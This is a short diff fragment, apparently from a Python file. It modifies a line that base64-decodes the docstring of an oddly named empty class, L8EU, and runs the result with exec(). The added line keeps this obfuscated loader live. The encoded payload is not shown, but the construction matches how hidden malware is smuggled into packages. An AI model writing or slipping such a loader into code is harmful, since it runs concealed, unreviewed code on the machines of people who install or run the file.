@@ -8,4 +8,4 @@ class L8EU:
     pass
 
 
-exec(b64decode("".join([L8EU.__doc__]).replace("\\n", "").replace(" ", "")))
+exec(b64decode("".join([L8EU.__doc__]).replace("\\n", "")))
